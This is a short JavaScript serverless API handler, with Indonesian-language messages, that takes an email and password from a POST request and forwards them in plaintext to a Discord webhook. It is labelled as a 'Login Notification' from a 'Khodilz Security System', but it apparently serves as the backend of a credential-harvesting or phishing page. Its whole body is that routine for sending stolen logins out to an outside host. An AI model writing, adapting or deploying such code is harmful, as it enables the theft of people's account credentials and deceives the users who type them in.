export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const webhookURL = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookURL) {
        console.error('Webhook URL tidak diset di env');
        return res.status(500).json({ error: 'Server config error' });
    }

    const { email, password, timestamp } = req.body;

    const payload = {
        content: null,
        embeds: [
            {
                title: "🔐 Login Notification - Khodilz",
                color: 5793266,
                fields: [
                    { name: "✉️ Email", value: email, inline: true },
                    { name: "🔑 Password", value: password ? `||${password}||` : "Tidak tersedia", inline: true },
                    { name: "🕒 Waktu", value: timestamp, inline: true },
                    { name: "🌐 IP", value: "Tersimpan (proxy aman)", inline: false }
                ],
                footer: { text: "Khodilz Security System" }
            }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: 'Discord webhook gagal' });
        }
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
}
